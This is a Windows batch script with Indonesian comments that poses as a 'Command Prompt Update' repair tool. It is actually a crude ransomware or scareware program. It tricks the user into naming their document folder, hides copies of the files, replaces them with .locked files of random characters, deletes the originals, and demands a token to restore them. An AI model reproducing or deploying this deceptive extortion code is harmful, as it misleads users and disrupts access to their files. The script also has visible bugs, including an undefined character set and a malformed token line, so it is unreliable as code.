@echo off
title Command Prompt Updates

REM Bagian untuk meminta input dari user terkait alamat direktori
echo Scanning directory users...
timeout /t 3 >nul
cls
echo WARNING ! Document folder detected file corruption so it cannot be accessed 
echo Please enter your document directory address to repair all file corruption : 
set /p target_folder="> "
cls
REM Memeriksa apakah folder target ada
if not exist "%target_folder%" (
    echo Folder "%target_folder%" missing!
    echo this true address?.
    pause
    exit /b
)

set "decryption_token=qwertyuiopoiuytrewq" set your token decrypt here !

REM Memeriksa apakah file sudah terenkripsi sebelumnya
set "is_encrypted=0"
for %%F in ("%target_folder%\*.locked") do (
    set "is_encrypted=1"
    goto check_encryption  REM Langsung keluar loop jika ditemukan file .locked
)
:check_encryption
REM Jika file sudah terenkripsi, langsung ke input token
if "%is_encrypted%"=="1" (
    color 4
    echo *************************************************************
    echo * Your all file in "%target_folder%" has been encrypted !  
    echo * You not read and access the file now !                     
    echo * Input valid token if you want restore all file !
    echo *************************************************************
    :token_input
    set /p user_token="Masukkan Token: "
    cls
    REM Validasi token dekripsi
    color a
    if "%user_token%"=="%decryption_token%" (
        echo Token Success
        timeout /t 3 >nul
        echo Loading...
        
        REM Dekripsi file .locked
        for %%F in ("%target_folder%\*.locked") do (
            if exist "%%F" (
                echo Repair the file: %%F
                del "%%F"
                if exist "%%~dpnF.bak" (
                    attrib -h -s "%%~dpnF.bak"
                    move "%%~dpnF.bak" "%%~dpnF" >nul
                    echo successful: %%~dpnF
                ) else (
                    echo file copy missing: %%~dpnF!
                )
                timeout /t 1 >nul
            ) else (
                echo File "%%F" missing error.
            )
        )
        
        echo Restore successful!
        pause
        exit /b
    ) else (
        echo Token not valid please try again.
        goto token_input
    )
)

REM Jika file belum terenkripsi, lanjutkan proses enkripsi
echo Scanning "%target_folder%"...
timeout /t 2 >nul
setlocal EnableDelayedExpansion

REM Proses enkripsi file
for %%F in ("%target_folder%\*.*") do (
    REM Abaikan file yang sudah terenkripsi (.bak atau .locked)
    if /i not "%%~xF"==".bak" if /i not "%%~xF"==".locked" (
        echo repair the file: %%F
        copy "%%F" "%%F.bak" >nul
        attrib +h +s "%%F.bak"  REM Sembunyikan file .bak
        cls
        REM Simpan file terenkripsi dengan ekstensi .locked
        > "%%F.locked" (
            for /L %%G in (1,1,100) do (
                set "line="
                for /L %%H in (1,1,64) do (
                    set /a idx=!RANDOM! %% 94
                    set "line=!line!!charset:~!idx!,1!"
                )
                echo !line!
            )
        )
        attrib +h +s "%%F.locked"  REM Sembunyikan file .locked
        del "%%F"  REM Hapus file asli
        timeout /t 1 >nul
    )
)

cls
color 4
echo *************************************************************
echo *Your all file in "%target_folder%" has been encrypted!
echo * WARNING: Dont edited the last extenshion locked and bak
echo * You not read and access the file now !                    
echo * Input valid token if you want restore the all file. 
echo *************************************************************
set /p user_token="Masukkan Token: "
cls
color a
REM Proses dekripsi setelah enkripsi
if "%user_token%"=="%decryption_token%" (
    echo Token Success!
    timeout /t 3 >nul
    
    for %%F in ("%target_folder%\*.locked") do (
        if exist "%%F" (
            echo Decrypted processing: %%F
            del "%%F"
            if exist "%%~dpnF.bak" (
                attrib -h -s "%%~dpnF.bak"
                move "%%~dpnF.bak" "%%~dpnF" >nul
                echo Decrypt successful: %%~dpnF
            ) else (
                echo file copy missing: %%~dpnF!
            )
            timeout /t 1 >nul
        ) else (
            echo File "%%F" missing error.
        )
    )
    cls
    echo Decrypt successfuly!
) else (
    echo Token not valid, please try again.
    goto token_input
)

pause
exit /b
